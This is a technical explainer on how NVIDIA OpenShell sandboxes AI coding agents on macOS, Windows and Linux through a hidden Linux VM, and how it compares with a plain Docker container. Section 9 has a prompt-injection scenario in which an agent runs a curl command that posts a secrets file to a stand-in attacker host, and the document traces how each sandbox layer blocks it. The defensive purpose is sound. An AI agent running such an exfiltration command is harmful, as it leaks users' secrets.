# OpenShell Cross-Platform — How It Really Works

A detailed technical analysis of how NVIDIA OpenShell achieves "cross-platform"
security using Linux-only kernel features, what actually runs where, the role
of Docker Desktop's hidden Linux VM, and how OpenShell compares to simply running
an agent in a plain Docker container.

---

## Table of Contents

1. [The Core Trick: Linux Everywhere, Hidden Behind Docker](#1-the-core-trick)
2. [macOS: Docker Desktop's Hidden Linux VM](#2-macos)
3. [Windows: WSL2's Hidden Linux Kernel](#3-windows)
4. [Native Linux: No VM, Direct Kernel](#4-native-linux)
5. [What Kernel Features Are Available Where](#5-kernel-features)
6. [File Sharing: The Performance Tax](#6-file-sharing)
7. [How Folder Allow/Deny Actually Works on macOS/Windows](#7-folder-allow-deny)
8. [Plain Docker Container vs OpenShell — What's the Difference?](#8-plain-docker-vs-openshell)
9. [What Extra Does OpenShell's Docker VM Offer?](#9-what-extra)
10. [Pros and Cons of the Cross-Platform Approach](#10-pros-and-cons)
11. [Practical Examples](#11-practical-examples)
12. [Implications for Guardian Shell](#12-implications-for-guardian-shell)

---

## 1. The Core Trick

Every security feature OpenShell uses — Landlock, seccomp, network namespaces,
cgroups — is a **Linux kernel feature**. None of these exist on macOS or Windows.

OpenShell's cross-platform strategy is simple: **bring a Linux kernel with you.**

```
"Cross-platform" actually means:

macOS:    macOS → Docker Desktop → LinuxKit VM (kernel 6.12) → OpenShell
Windows:  Windows → Docker Desktop → WSL2 VM (kernel 6.6)   → OpenShell
Linux:    Linux → Docker → OpenShell (direct, no VM)
```

The developer's host OS is irrelevant to the security model. All enforcement
happens inside a Linux kernel that ships with Docker Desktop. The host OS is
just a convenient way to launch the VM.

---

## 2. macOS: Docker Desktop's Hidden Linux VM

### What Runs Where

```
┌───────────────────────────────────────────────────────────┐
│  macOS (Apple Silicon / Intel)                            │
│  Kernel: XNU (Darwin). No Landlock. No seccomp.          │
│  No eBPF (not the Linux kind). No cgroups.               │
│                                                           │
│  ┌─────────────────────────────────────────────────────┐  │
│  │  Docker Desktop                                     │  │
│  │  Hypervisor: Apple Virtualization Framework          │  │
│  │  (or Docker VMM on Apple Silicon, beta)             │  │
│  │                                                     │  │
│  │  ┌───────────────────────────────────────────────┐  │  │
│  │  │  LinuxKit VM                                  │  │  │
│  │  │  Kernel: Linux 6.12.72                        │  │  │
│  │  │  RAM: Configurable (default ~4-8 GB)          │  │  │
│  │  │  Disk: Virtual disk image (~64 GB default)    │  │  │
│  │  │                                               │  │  │
│  │  │  Available kernel features:                   │  │  │
│  │  │  ✓ Landlock LSM (ABI v1-v5)                   │  │  │
│  │  │  ✓ seccomp BPF                                │  │  │
│  │  │  ✓ Network namespaces                         │  │  │
│  │  │  ✓ cgroups v2                                 │  │  │
│  │  │  ✓ eBPF (CONFIG_BPF=y, JIT=y)                │  │  │
│  │  │  ✓ veth pairs                                 │  │  │
│  │  │  ✓ iptables / nftables                        │  │  │
│  │  │                                               │  │  │
│  │  │  ┌─────────────────────────────────────────┐  │  │  │
│  │  │  │  OpenShell Container (K3s cluster)      │  │  │  │
│  │  │  │  ┌─────────────────────────────────┐    │  │  │  │
│  │  │  │  │  Sandbox Pod (per agent)        │    │  │  │  │
│  │  │  │  │  Landlock ✓  seccomp ✓          │    │  │  │  │
│  │  │  │  │  netns ✓     proxy ✓            │    │  │  │  │
│  │  │  │  └─────────────────────────────────┘    │  │  │  │
│  │  │  └─────────────────────────────────────────┘  │  │  │
│  │  └───────────────────────────────────────────────┘  │  │
│  └─────────────────────────────────────────────────────┘  │
│                                                           │
│  What macOS provides:                                     │
│  • Hardware virtualization (Hypervisor.framework)          │
│  • File sharing to VM (virtiofs / gRPC-FUSE)              │
│  • Port forwarding from VM to host                        │
│  • GUI for Docker Desktop settings                        │
│  • Native CLI binary (openshell, docker)                  │
│                                                           │
│  What macOS does NOT provide:                             │
│  ✗ Any kernel-level security enforcement                  │
│  ✗ Landlock, seccomp, eBPF, cgroups                       │
│  ✗ Protection of macOS-native files outside volume mounts │
└───────────────────────────────────────────────────────────┘
```

### Hypervisor Options on macOS

| Hypervisor | Platform | Status | Performance |
|-----------|----------|--------|-------------|
| **Apple Virtualization Framework** | Intel + Apple Silicon | Default since DD 4.44 | Stable, good performance |
| **Docker VMM** | Apple Silicon only | Beta since DD 4.35 | 2x faster cold cache, up to 25x faster warm cache file I/O vs Apple VF |
| **HyperKit** | Intel only | Deprecated | Legacy, slower |

### The Invisible VM

Most macOS developers don't realize Docker runs a VM. When you type `docker run`,
the container appears to run "on your Mac" but it's actually running inside the
LinuxKit VM. The VM is invisible — Docker Desktop manages it automatically.

This is why `docker run --privileged` works on macOS even though macOS has no
concept of Linux capabilities: the `--privileged` flag applies inside the Linux
VM, not on the macOS host.

---

## 3. Windows: WSL2's Hidden Linux Kernel

### What Runs Where

```
┌───────────────────────────────────────────────────────────┐
│  Windows 10/11                                            │
│  Kernel: NT. No Landlock. No seccomp. No eBPF.            │
│                                                           │
│  ┌─────────────────────────────────────────────────────┐  │
│  │  WSL2 (Windows Subsystem for Linux)                 │  │
│  │  Hypervisor: Hyper-V (lightweight utility VM)       │  │
│  │                                                     │  │
│  │  ┌───────────────────────────────────────────────┐  │  │
│  │  │  Linux VM                                     │  │  │
│  │  │  Kernel: Linux 6.6.114.1 (LTS)               │  │  │
│  │  │                                               │  │  │
│  │  │  Available kernel features:                   │  │  │
│  │  │  ✓ Landlock LSM (ABI v1-v3)                   │  │  │
│  │  │  ✓ seccomp BPF                                │  │  │
│  │  │  ✓ Network namespaces                         │  │  │
│  │  │  ✓ cgroups v2                                 │  │  │
│  │  │  △ eBPF (partial — BPF_LSM not confirmed)     │  │  │
│  │  │  ✓ veth pairs                                 │  │  │
│  │  │                                               │  │  │
│  │  │  ┌─────────────────────────────────────────┐  │  │  │
│  │  │  │  Docker Desktop (uses WSL2 backend)     │  │  │  │
│  │  │  │  ┌─────────────────────────────────┐    │  │  │  │
│  │  │  │  │  OpenShell Container (K3s)      │    │  │  │  │
│  │  │  │  │  Sandbox pods inside...         │    │  │  │  │
│  │  │  │  └─────────────────────────────────┘    │  │  │  │
│  │  │  └─────────────────────────────────────────┘  │  │  │
│  │  └───────────────────────────────────────────────┘  │  │
│  └─────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────┘
```

### Key Difference from macOS

On Windows, the file sharing between the Windows NTFS filesystem and the Linux
VM uses the **9P protocol** (Plan 9), which is significantly slower than macOS's
virtiofs:

```
Windows file access paths:

Fast (Linux-native):
  /home/user/project/   → ext4 inside VM → near-native speed

Slow (Windows files):
  /mnt/c/Users/project/ → 9P protocol → NTFS → very slow
                           ↑
                     Every I/O call crosses
                     the VM boundary via 9P
```

### Landlock ABI Limitation on WSL2

WSL2 runs kernel 6.6, which supports Landlock **ABI v1-v3** only:
- **v1** (5.13): Basic filesystem access control
- **v2** (5.19): File refer (move between directories)
- **v3** (6.4): File truncation

**Missing on WSL2:**
- **v4** (6.7): TCP network port filtering — NOT AVAILABLE
- **v5** (6.10): IOCTL restrictions — NOT AVAILABLE

This means on Windows, OpenShell's Landlock TCP network filtering does not work.
Network enforcement relies entirely on the network namespace + proxy. On macOS
(Docker Desktop kernel 6.12), all ABI versions including TCP filtering are
available.

---

## 4. Native Linux: No VM, Direct Kernel

```
┌───────────────────────────────────────────────────────────┐
│  Linux Host (kernel 6.x)                                  │
│                                                           │
│  All kernel features available directly:                  │
│  ✓ Landlock LSM (ABI depends on kernel version)           │
│  ✓ seccomp BPF                                            │
│  ✓ eBPF (full, including BPF LSM if CONFIG_BPF_LSM=y)     │
│  ✓ Network namespaces                                     │
│  ✓ cgroups v2                                             │
│  ✓ veth pairs                                             │
│  ✓ iptables / nftables                                    │
│                                                           │
│  ┌─────────────────────────────────────────────────────┐  │
│  │  Docker (native, no VM)                             │  │
│  │  ┌─────────────────────────────────────────────┐    │  │
│  │  │  OpenShell Container (K3s cluster)          │    │  │
│  │  │  Sandbox pods run on host kernel directly   │    │  │
│  │  └─────────────────────────────────────────────┘    │  │
│  └─────────────────────────────────────────────────────┘  │
│                                                           │
│  OR (Guardian Shell — no Docker needed):                   │
│  ┌─────────────────────────────────────────────────────┐  │
│  │  guardian daemon (eBPF + Landlock + seccomp)         │  │
│  │  Runs directly on host kernel. No VM. No container. │  │
│  └─────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────┘
```

On native Linux:
- No VM overhead — containers run on the host kernel directly
- File I/O at native speed — no virtiofs/9P translation
- Full kernel feature availability — depends only on kernel version
- Guardian Shell can run without Docker entirely (single binary)

---

## 5. What Kernel Features Are Available Where

| Feature | macOS (DD 4.66) | Windows (WSL2 2.7) | Linux (native) |
|---------|----------------|-------------------|----------------|
| **Landlock ABI v1** (filesystem) | ✓ (kernel 6.12) | ✓ (kernel 6.6) | ✓ (kernel 5.13+) |
| **Landlock ABI v2** (file refer) | ✓ | ✓ | ✓ (kernel 5.19+) |
| **Landlock ABI v3** (truncation) | ✓ | ✓ | ✓ (kernel 6.4+) |
| **Landlock ABI v4** (TCP network) | ✓ | **NO** (needs 6.7) | ✓ (kernel 6.7+) |
| **Landlock ABI v5** (IOCTL) | ✓ | **NO** (needs 6.10) | ✓ (kernel 6.10+) |
| **seccomp BPF** | ✓ | ✓ | ✓ (kernel 3.17+) |
| **eBPF (basic)** | ✓ | ✓ | ✓ (kernel 4.x+) |
| **BPF LSM** | Unconfirmed | **NO** (not compiled) | Depends on CONFIG |
| **cgroups v2** | ✓ | ✓ | ✓ (kernel 4.15+) |
| **Network namespaces** | ✓ | ✓ | ✓ |
| **veth pairs** | ✓ | ✓ | ✓ |
| **iptables** | ✓ | ✓ | ✓ |

### What This Means Practically

**macOS via Docker Desktop** has the most complete kernel feature set of any
non-Linux platform because Docker Desktop ships a newer kernel (6.12) than WSL2
(6.6). All Landlock ABI versions including TCP network filtering work.

**Windows via WSL2** is missing Landlock TCP network filtering (ABI v4) and
IOCTL restrictions (ABI v5). OpenShell's Landlock can protect the filesystem
but cannot enforce TCP port rules. The network namespace + proxy must handle all
network enforcement.

**Linux native** has whatever your distro kernel supports. Modern distros
(Ubuntu 24.04+, Fedora 40+) ship kernel 6.8+ with full Landlock support.

---

## 6. File Sharing: The Performance Tax

### The Problem

When an agent needs to work on files from your host machine (your Mac project
folder, your Windows source code), those files must be shared into the Linux VM.
This sharing has a performance cost.

### macOS File Sharing Stack

```
Your Mac project folder
  /Users/suren/projects/myapp/
         │
         ▼
┌──────────────────────────┐
│ virtiofs (shared memory) │  Docker Desktop 4.6+
│ or gRPC-FUSE (legacy)    │  (virtiofs is default)
└──────────┬───────────────┘
           │  Every read/write crosses the VM boundary
           ▼
┌──────────────────────────┐
│ Linux VM (LinuxKit)      │
│ Sees files as a FUSE     │
│ mount at /host/...       │
└──────────┬───────────────┘
           │
           ▼
┌──────────────────────────┐
│ Container (overlay on    │
│ top of VM filesystem)    │
│ Bind mount: /workspace   │
└──────────────────────────┘
```

### Performance Benchmarks

**macOS file I/O (npm install benchmark — React app):**

| Configuration | Time | vs Native Linux |
|--------------|------|-----------------|
| Linux Docker (native, no VM) | 5.29s | 1.0x (baseline) |
| Docker VMM + bind mount (beta) | 8.47s | 1.6x slower |
| Apple VF + virtiofs bind mount | 9.53s | 1.8x slower |
| Apple VF + gRPC-FUSE (legacy) | ~25s | ~5x slower |
| Apple VF + Synchronized shares | 3.88s | 0.7x (faster!) |
| Container-internal ext4 (no mount) | ~5.5s | ~1.0x (near native) |

**Key insight**: If files live **inside** the container (not bind-mounted from
the host), I/O is near-native speed. The performance tax only applies to files
shared from the host OS.

**Windows file I/O:**

| Path | Speed |
|------|-------|
| `/home/user/project/` (Linux-native ext4) | Near-native |
| `/mnt/c/Users/project/` (Windows NTFS via 9P) | 3-10x slower than native |

**9P on Windows is significantly worse than virtiofs on macOS.** For any serious
development work on Windows, the recommendation is to keep project files inside
the WSL2 Linux filesystem, not on the Windows NTFS side.

### How OpenShell Avoids the Performance Tax

OpenShell uses a clever approach: **it does not use Docker bind mounts for
in-sandbox file I/O.**

```
Standard Docker approach:
  Host files → virtiofs → VM → bind mount → container → agent reads
  (every I/O crosses the VM boundary — slow)

OpenShell approach:
  1. Host files → SSH tunnel → rsync → copied INTO container filesystem
  2. Agent works on container-internal ext4 (fast, near-native)
  3. Changes → rsync back → SSH tunnel → host files

  In-sandbox I/O never crosses the VM boundary.
```

This means the virtiofs performance penalty is paid once (during sync) rather than
on every read/write. For workloads with many small file operations (compilers, npm
install, git operations), this is a significant improvement.

---

## 7. How Folder Allow/Deny Actually Works on macOS/Windows

This is the critical section. When you configure "allow /Users/suren/projects/"
and "deny ~/.ssh/", here's what actually enforces it on each platform.

### On macOS

```
You configure:
  allow: ["/workspace"]
  deny: everything else

What actually happens:

LAYER 1: Docker volume mount (macOS host → Linux VM)
  docker run -v /Users/suren/projects/myapp:/workspace ...

  This is the FIRST security boundary.
  Only /Users/suren/projects/myapp/ is visible inside the VM.
  ~/.ssh/, ~/.aws/, /etc/ — don't exist inside the container.
  They are not "denied" — they are INVISIBLE.

LAYER 2: Landlock (inside Linux VM)
  Landlock ruleset:
    read_write: ["/workspace"]
    read_only:  ["/usr/lib", "/etc/resolv.conf", "/dev/null"]

  This is the SECOND security boundary.
  Even within the container, the agent can only access paths
  in the Landlock allowlist. /tmp (if it exists in the container)
  would be blocked unless explicitly allowed.

LAYER 3: seccomp (inside Linux VM)
  Blocks dangerous syscalls regardless of file/network access.

LAYER 4: Network namespace + proxy (inside Linux VM)
  All network traffic forced through proxy.
  Even if agent somehow reads a file, it can't exfiltrate it
  without the proxy allowing the destination.
```

### Visual: What the Agent Can See

```
macOS host filesystem:              What agent sees inside container:
/                                   /
├── Users/                          ├── workspace/          ← ONLY this
│   └── suren/                      │   ├── src/
│       ├── projects/               │   ├── package.json
│       │   ├── myapp/     ──────►  │   └── ...
│       │   └── secret/    ✗        │
│       ├── .ssh/          ✗        ├── usr/lib/            ← read-only
│       ├── .aws/          ✗        ├── etc/resolv.conf     ← read-only
│       ├── Documents/     ✗        ├── dev/null            ← read-only
│       └── Desktop/       ✗        └── (nothing else)
├── etc/                   ✗
├── var/                   ✗
└── Library/               ✗

✗ = does not exist inside container (not "denied" — literally absent)
```

### On Windows

Same model, but with 9P instead of virtiofs:

```
docker run -v C:\Users\suren\projects\myapp:/workspace ...

Windows NTFS path → 9P protocol → WSL2 VM → container filesystem
                     ↑
               Slower than virtiofs on macOS
```

### The Fundamental Limitation

**You cannot protect individual files within a mounted folder using Landlock alone
on the host OS.** The protection model is:

```
Coarse-grained (which folders are visible):
  Controlled by: Docker volume mounts
  Granularity:   Entire directory trees
  Enforced by:   Docker/VM boundary

Fine-grained (read vs write vs execute within visible folders):
  Controlled by: Landlock rules
  Granularity:   Individual files and directories
  Enforced by:   Linux kernel inside VM
```

**Example: You mount your entire home directory (BAD practice):**

```bash
docker run -v /Users/suren:/home/suren openshell-sandbox

# Now EVERYTHING is inside the container:
# ~/.ssh/id_rsa           — visible to agent
# ~/.aws/credentials      — visible to agent
# ~/projects/secret/      — visible to agent
#
# Landlock CAN still protect them:
#   read_write: ["/home/suren/projects/myapp"]
#   (everything else denied by Landlock default-deny)
#
# But you're relying solely on Landlock, not on mount isolation.
# If Landlock has a bug or is misconfigured, everything is exposed.
```

**Best practice: Mount only what the agent needs.** Use the Docker mount as
the first defense (coarse) and Landlock as the second (fine-grained).

---

## 8. Plain Docker Container vs OpenShell — What's the Difference?

This is the key question: "I can just run my agent in a Docker container.
Why do I need OpenShell?"

### Plain Docker Container

```bash
# Simple approach: run agent in Docker
docker run -it \
  -v ~/projects/myapp:/workspace \
  -e ANTHROPIC_API_KEY=sk-ant-real-key \
  node:20 bash

# Inside container:
cd /workspace
npx claude-code  # or whatever agent
```

**What you get:**
- Container filesystem isolation (agent can't see host files outside mounts)
- Container network namespace (but with full internet access by default)
- Separate process namespace

**What you DON'T get:**

| Missing Feature | Risk |
|----------------|------|
| No Landlock | Agent has full read/write to everything inside container, including mounted volumes |
| No seccomp (or only Docker's default profile) | Agent can use most syscalls, including some dangerous ones |
| No network policy | Agent can reach ANY host on the internet |
| No L7 inspection | Agent can POST your code to any API endpoint |
| No per-binary policy | All processes in container share same permissions |
| No credential isolation | `echo $ANTHROPIC_API_KEY` prints the real key |
| No binary integrity | Agent can replace binaries without detection |
| No SSRF prevention | Agent can reach 169.254.169.254 (cloud metadata) |
| No process identity tracking | Can't tell which binary made which request |
| No policy hot-reload | Must restart container to change policy |
| No audit trail | No record of what the agent accessed |

### OpenShell Sandbox

```bash
# OpenShell approach:
openshell sandbox create --image node:20 --policy secure-agent.yaml
openshell sandbox enter <sandbox-id>
```

**What you get (everything Docker provides, PLUS):**

```
┌─────────────────────────────────────────────────────────────┐
│ Plain Docker Container                                      │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Container namespace isolation                           │ │
│ │ Container filesystem isolation                          │ │
│ └─────────────────────────────────────────────────────────┘ │
│                                                             │
│ + OpenShell adds:                                           │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Layer 1: Landlock LSM                                   │ │
│ │   Kernel-enforced filesystem allowlist                   │ │
│ │   Inode-based (immune to symlinks/TOCTOU)               │ │
│ │   Read-only vs read-write per path                      │ │
│ │   Applied before exec, immutable afterward              │ │
│ ├─────────────────────────────────────────────────────────┤ │
│ │ Layer 2: seccomp BPF                                    │ │
│ │   Blocks AF_NETLINK, AF_PACKET, AF_BLUETOOTH, AF_VSOCK  │ │
│ │   In Block mode: blocks AF_INET/AF_INET6 entirely       │ │
│ │   Prevents raw socket creation (proxy bypass)           │ │
│ ├─────────────────────────────────────────────────────────┤ │
│ │ Layer 3: Network namespace + veth pair                  │ │
│ │   Agent in isolated netns, can only reach proxy         │ │
│ │   10.200.0.2 (agent) ←veth→ 10.200.0.1 (proxy)        │ │
│ │   iptables bypass detection rules (log + reject)        │ │
│ ├─────────────────────────────────────────────────────────┤ │
│ │ Layer 4: HTTP CONNECT proxy                             │ │
│ │   Every outbound connection intercepted                  │ │
│ │   OPA/Rego policy evaluation per connection              │ │
│ │   L7 HTTP inspection (method + path + headers)           │ │
│ │   SSRF prevention (3-tier IP filtering)                  │ │
│ │   TLS interception (ephemeral CA)                        │ │
│ ├─────────────────────────────────────────────────────────┤ │
│ │ Layer 5: Process identity binding                       │ │
│ │   /proc inspection identifies which binary connects      │ │
│ │   Per-binary network policy                              │ │
│ │   SHA256 TOFU binary integrity checking                  │ │
│ ├─────────────────────────────────────────────────────────┤ │
│ │ Layer 6: Credential isolation                           │ │
│ │   Real API keys never enter sandbox                      │ │
│ │   Placeholder injection in env vars                      │ │
│ │   Proxy substitutes real keys at HTTP level              │ │
│ │   inference.local routing hides provider details         │ │
│ ├─────────────────────────────────────────────────────────┤ │
│ │ Layer 7: Privilege separation                           │ │
│ │   Supervisor (privileged) spawns agent (unprivileged)    │ │
│ │   PR_SET_NO_NEW_PRIVS prevents escalation               │ │
│ │   setuid/setgid to sandbox:sandbox user                  │ │
│ ├─────────────────────────────────────────────────────────┤ │
│ │ Layer 8: Policy engine                                  │ │
│ │   Declarative YAML policies                              │ │
│ │   Hot-reloadable network policies (no restart)           │ │
│ │   Version tracking with last-known-good rollback         │ │
│ │   Global policy overrides                                │ │
│ └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Side-by-Side Comparison

| Capability | Plain Docker | OpenShell | Difference |
|-----------|-------------|-----------|------------|
| **File isolation** | Mount boundary only | Mount + Landlock (inode-level) | Landlock adds fine-grained control within mounts |
| **Symlink protection** | None (container sees real symlinks) | Landlock inode-based (immune) | OpenShell blocks symlink attacks |
| **Network access** | Full internet by default | Proxy-only (default deny) | OpenShell blocks all unauthorized hosts |
| **Network inspection depth** | None | L4 (host:port) + L7 (method/path) | OpenShell can block "POST to allowed host" |
| **Credential protection** | None (env vars readable) | Placeholder injection | OpenShell hides real API keys |
| **SSRF defense** | None | 3-tier IP filtering + DNS check | OpenShell blocks metadata service access |
| **Syscall filtering** | Docker default seccomp profile (~300 allowed) | Targeted seccomp (blocks raw sockets) | Different focus: Docker blocks broad classes, OpenShell targets proxy bypass |
| **Binary integrity** | None | SHA256 TOFU | OpenShell detects replaced binaries |
| **Per-binary policy** | None (all processes equal) | /proc-based identity binding | OpenShell distinguishes git from python |
| **Policy language** | None (or Dockerfile) | YAML + OPA/Rego | OpenShell has rich policy engine |
| **Hot reload** | Restart container | Network policy hot-reload | OpenShell changes policy without downtime |
| **Privilege separation** | Root or USER in Dockerfile | Supervisor/child split with formal drop | OpenShell has verified privilege separation |
| **mTLS** | None | CLI ↔ gateway ↔ sandbox | OpenShell authenticates all communication |
| **Inference routing** | None | inference.local transparent proxy | OpenShell routes LLM calls with hidden credentials |
| **Audit/logging** | Docker logs only | Proxy logs + bypass detection + process identity | OpenShell has security-focused logging |

### The Bottom Line

A plain Docker container gives you **coarse isolation** — the agent is in a box
but has unrestricted movement within that box. OpenShell gives you **fine-grained
enforcement** — the agent is in a box where every file access, network connection,
and binary execution is individually controlled and audited.

The difference is similar to renting an apartment (plain Docker — you control the
walls) vs a security vault (OpenShell — every room has its own lock, every door
has a camera, and every visitor is identified).

---

## 9. What Extra Does OpenShell's Docker VM Offer on macOS/Windows?

"If I'm already running Docker on my Mac, what does OpenShell add beyond what
Docker already provides?"

### What Docker Desktop Already Provides (Without OpenShell)

```
On macOS, Docker Desktop gives you:

✓ A Linux kernel (6.12) with full feature support
✓ Container namespace isolation (pid, net, mount, user)
✓ A default seccomp profile (blocks ~50 dangerous syscalls)
✓ Container filesystem isolation
✓ Resource limits (memory, CPU) via cgroups
✓ Network isolation (bridge, none, host modes)
✓ Port mapping for exposing services
```

### What OpenShell Adds ON TOP of Docker Desktop

```
OpenShell adds 8 layers that Docker Desktop does not provide:

1. LANDLOCK (Docker doesn't enable this by default)
   Docker's seccomp profile doesn't restrict file paths.
   Landlock adds per-path read/write/execute control.
   Agent in Docker: can read EVERYTHING in the container.
   Agent in OpenShell: can only read allowed paths.

2. DEDICATED NETWORK NAMESPACE PER SANDBOX
   Docker gives each container a network namespace, but with
   access to the Docker bridge network (and thus the internet).
   OpenShell creates an ADDITIONAL network namespace inside the
   container with a veth pair — agent can ONLY reach the proxy.

3. HTTP CONNECT PROXY WITH L7 INSPECTION
   Docker has no application-layer traffic inspection.
   OpenShell's proxy sees every HTTP request: method, path, headers.

4. OPA/REGO POLICY ENGINE
   Docker has no built-in policy evaluation for network traffic.
   OpenShell evaluates every connection against declarative policies.

5. CREDENTIAL ISOLATION
   Docker passes env vars directly to the container.
   OpenShell replaces them with placeholders.

6. PER-BINARY NETWORK POLICY + BINARY INTEGRITY
   Docker treats all processes in a container equally.
   OpenShell distinguishes between binaries via /proc.

7. SSRF PREVENTION
   Docker doesn't block connections to private IP ranges.
   Agent in Docker: can reach 169.254.169.254 (cloud metadata).
   Agent in OpenShell: blocked by default.

8. INFERENCE ROUTING
   Docker has no concept of LLM inference routing.
   OpenShell's inference.local hides provider details from agent.
```

### Concrete Example: What Happens When an Agent Goes Rogue

```
Scenario: Prompt injection tells the agent to exfiltrate source code

IN PLAIN DOCKER:
  Agent: curl -X POST https://attacker.com/steal -d @/workspace/secrets.env
  → Docker: Connection allowed (no network policy)
  → attacker.com receives your secrets
  → No audit trail. No alert. No detection.

IN OPENSHELL:
  Agent: curl -X POST https://attacker.com/steal -d @/workspace/secrets.env

  Step 1 — Landlock:
    open("/workspace/secrets.env") → check Landlock allowlist
    If secrets.env is in read_write paths → allowed to read
    If not → EACCES (blocked before curl can read the file)

  Step 2 — Network namespace:
    connect(attacker.com:443) → routed to proxy (10.200.0.1:3128)
    Agent cannot bypass proxy (iptables REJECT + log)

  Step 3 — Proxy L4 check:
    OPA: is attacker.com in any allowed endpoint? → NO → DENY

  Even if attacker.com were somehow allowed:

  Step 4 — Proxy L7 check:
    OPA: is POST allowed to /steal? → NO → DENY

  Even if POST /steal were somehow allowed:

  Step 5 — Per-binary check:
    Proxy: which binary? → /usr/bin/curl
    Policy: curl not in allowed binaries for this endpoint → DENY

  Even if curl were allowed:

  Step 6 — Binary integrity:
    Proxy: SHA256(curl) matches TOFU baseline? → YES → OK
    (If curl had been replaced with a trojan: DENY)

  Step 7 — SSRF check (if attacker.com resolved to private IP):
    DNS resolve → check IP → if private range → DENY

  Result: 6 opportunities to block the attack.
  All attempts logged with process identity.
```

---

## 10. Pros and Cons of the Cross-Platform Approach

### Pros

| Advantage | Detail |
|-----------|--------|
| **Works on macOS** | Most developers use macOS. Without Docker-based approach, they couldn't use kernel security features at all. |
| **Works on Windows** | WSL2 provides a real Linux kernel. Same security features (with ABI limitations). |
| **Identical security on all platforms** | Same Linux kernel inside the VM means same Landlock behavior, same seccomp filters, same network namespaces. No platform-specific security bugs. |
| **No kernel modification needed** | Stock Docker Desktop kernel has everything needed. No custom kernel compilation. |
| **Easy deployment** | `docker run` is the only prerequisite. No apt-get, no cargo install, no kernel config. |
| **Isolation from host** | VM boundary means a sandbox escape only reaches the VM, not the macOS/Windows host. The VM is an additional security layer. |
| **Consistent kernel version** | Docker Desktop ships a known kernel (6.12). No "works on Ubuntu 24.04 but not on RHEL 8" problems. |
| **Multi-architecture** | Docker Desktop runs on both Intel and Apple Silicon. Container images built for amd64 + arm64. |

### Cons

| Disadvantage | Detail |
|-------------|--------|
| **File I/O performance** | Volume-mounted host files are 1.6-3x slower than native. Git operations, npm install, compilation all affected. |
| **Memory overhead** | Docker Desktop VM consumes dedicated RAM (4-8 GB typical). Does not always release memory back to host promptly. Known macOS issue with 9+ GB discrepancies. |
| **Startup latency** | VM boot (if cold) + K3s bootstrap (30-60s) + pod scheduling + container pull. Much slower than process-level isolation. |
| **Host filesystem not protected** | Landlock runs inside the VM, not on the host. Your Mac files are protected by what you choose to mount, not by Landlock. |
| **Docker Desktop required** | ~3 GB install. Requires license for commercial use at companies with 250+ employees or $10M+ revenue. |
| **Nested virtualization complexity** | On some cloud instances (AWS, GCP), running a VM inside a VM can be problematic or unsupported. |
| **Debugging difficulty** | Security issues span three layers (host → VM → container). Debugging file permission errors requires understanding which layer denied access. |
| **Docker Desktop updates can break things** | Docker Desktop kernel upgrades can change Landlock ABI availability, seccomp defaults, or eBPF support. |
| **No real-time host file monitoring** | Cannot monitor file accesses on the macOS host. eBPF tracepoints only fire inside the Linux VM for files inside the VM. |
| **WSL2 Landlock ABI gap** | Windows users miss Landlock TCP filtering (ABI v4) and IOCTL restrictions (ABI v5) because WSL2 ships kernel 6.6. |
| **Volume mount is all-or-nothing** | You mount an entire directory tree. Cannot mount "all of ~/projects/ except ~/projects/secret/". Must structure mounts carefully. |
| **virtiofs cache coherence** | In rare cases, virtiofs can serve stale data if files change rapidly on the host side while the container is reading. |

---

## 11. Practical Examples

### Example 1: Python AI Agent on macOS

```bash
# You have:
#   ~/projects/webapp/        — the project to work on
#   ~/.ssh/id_ed25519         — SSH key (MUST NOT be exposed)
#   ~/.aws/credentials        — AWS creds (MUST NOT be exposed)
#   ANTHROPIC_API_KEY=sk-ant-... — API key in env

# Step 1: Create OpenShell sandbox
openshell sandbox create \
  --image python:3.12 \
  --policy coding-agent.yaml \
  --mount ~/projects/webapp:/workspace

# What happens under the hood:
#
# 1. Docker Desktop's LinuxKit VM is already running (kernel 6.12)
# 2. OpenShell's K3s cluster creates a new pod
# 3. ~/projects/webapp/ is shared via virtiofs into the VM,
#    then bind-mounted into the pod as /workspace
# 4. Supervisor process starts inside the pod:
#    a. Creates network namespace with veth pair
#    b. Starts HTTP CONNECT proxy on 10.200.0.1:3128
#    c. Sets up iptables bypass detection rules
#    d. Drops privileges to sandbox:sandbox user
#    e. Applies Landlock: read_write=["/workspace"], read_only=["/usr/lib"...]
#    f. Applies seccomp: blocks AF_PACKET, AF_BLUETOOTH, etc.
#    g. Replaces ANTHROPIC_API_KEY with placeholder
#    h. Execs the agent process
#
# 5. Agent runs as unprivileged user inside:
#    - Landlock sandbox (can only access /workspace + system libs)
#    - Network namespace (can only reach proxy)
#    - seccomp filter (dangerous syscalls blocked)
#    - Credential isolation (only sees placeholder API key)

# What the agent CAN do:
#   ✓ Read and write files in /workspace/
#   ✓ Run python, pip (if in container image)
#   ✓ Call api.anthropic.com via proxy (if policy allows)
#   ✓ Read system libraries for Python execution

# What the agent CANNOT do:
#   ✗ Read ~/.ssh/ (not mounted, doesn't exist)
#   ✗ Read ~/.aws/ (not mounted, doesn't exist)
#   ✗ See real ANTHROPIC_API_KEY (only sees placeholder)
#   ✗ Reach attacker.com (not in network policy)
#   ✗ Reach 169.254.169.254 (SSRF blocked)
#   ✗ Access /etc/shadow (Landlock denies)
#   ✗ Use raw sockets (seccomp blocks)
#   ✗ Escape to macOS host (VM boundary)
```

### Example 2: Same Agent in Plain Docker (No OpenShell)

```bash
# Plain Docker approach:
docker run -it \
  -v ~/projects/webapp:/workspace \
  -e ANTHROPIC_API_KEY=sk-ant-real-key \
  python:3.12 bash

# What the agent CAN do:
#   ✓ Read and write files in /workspace/
#   ✓ Run ANY binary in the container
#   ✓ Reach ANY host on the internet
#   ✓ Read ANTHROPIC_API_KEY from env: echo $ANTHROPIC_API_KEY → sk-ant-real-key
#   ✓ Access ALL files inside the container (no Landlock)
#   ✓ Reach 169.254.169.254 (cloud metadata)
#   ✓ POST your source code to attacker.com
#   ✓ Install and run arbitrary packages

# What the agent CANNOT do:
#   ✗ Read ~/.ssh/ (not mounted) ← same as OpenShell
#   ✗ Read ~/.aws/ (not mounted) ← same as OpenShell
#   ✗ Access macOS host filesystem outside mounts ← same as OpenShell

# THE GAP: Inside the container, agent has UNRESTRICTED access.
# No Landlock, no proxy, no per-binary policy, no credential isolation.
```

